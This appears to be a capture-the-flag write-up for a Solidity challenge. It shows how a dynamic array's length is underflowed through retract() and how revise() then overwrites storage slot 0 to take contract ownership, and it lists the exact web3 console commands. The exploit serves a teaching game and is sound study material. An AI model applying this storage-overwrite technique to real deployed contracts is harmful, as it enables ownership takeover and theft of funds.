Notes before solving:
1. We have bytes32 array that is dynamic. Dynamic array has underflow weakness so if the array is set to 0 by decrementing it we will reach the highest number for a dynamic array.
2. We have a function that will turn contact to true ``make_contact``
3. We have function retract that allow us to pop the top from the array.
4. We have revise function that allow us to replace the inside the array.

## How we will attack:
1. Call make_contact and turn contact to true.
2. Then we will call retract inorder to underflow and have full control on contract storage.
3. Then we find where the contract owner set and call the revise method to add our address.

## Attack
1. await contract.make_contact()
2. await contract.retract()
3. We will get the length of the array by calling p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"],[1])) .
4. Now we will get the owner address. i = BigInt(2**256) -BigInt(p) . The owner is in the in slot 0 in the bytes array.
5. content = "0x" + '0'.repeat(24) + player.slice(2)  this is the one that we will replace.
6. To switch with the owner contract await contract.revise(i,content) 
